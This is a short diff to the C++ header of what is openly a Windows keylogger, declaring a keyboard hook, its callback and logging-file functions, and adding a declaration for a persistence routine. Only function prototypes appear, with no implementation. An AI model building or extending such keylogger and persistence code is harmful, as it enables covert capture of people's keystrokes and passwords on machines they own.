@@ -14,5 +14,6 @@ inline HHOOK KeyboardHook;
 LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);
 HANDLE CreateNewLoggingFile(std::string);
 void WriteToLoggingFile(const std::string&, const HANDLE);
+void CreatePersistence(std::string);
 
 #endif // KEYLOGGER_H
